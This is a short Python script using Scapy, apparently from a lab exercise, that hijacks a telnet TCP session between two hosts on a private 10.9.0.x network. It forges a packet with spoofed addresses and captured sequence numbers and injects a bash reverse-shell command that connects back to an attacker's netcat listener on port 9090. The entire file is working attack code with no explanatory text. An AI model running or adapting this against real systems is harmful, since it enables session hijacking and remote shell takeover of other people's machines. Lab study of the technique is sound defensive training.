#!/usr/bin/env python3
from scapy.all import *

# Replace with your values
src_ip = "10.9.0.5"    # hostA's IP (client)
dst_ip = "10.9.0.6"    # hostB's IP (server)
sport = 60644          # hostA's source port (from tcpdump)
dport = 23             # telnet port
seq_num = 3930570828         # Latest seq from hostA (adjust!)
ack_num = 1845251651         # Latest ack from hostB (adjust!)
attacker_ip = "10.9.0.1"     # Attacker's IP (where netcat runs)

# Reverse shell command
command = f"/bin/bash -i > /dev/tcp/{attacker_ip}/9090 0<&1 2>&1\r\n"

# Craft packet
ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
pkt = ip/tcp/command

# Send packet
send(pkt, verbose=0)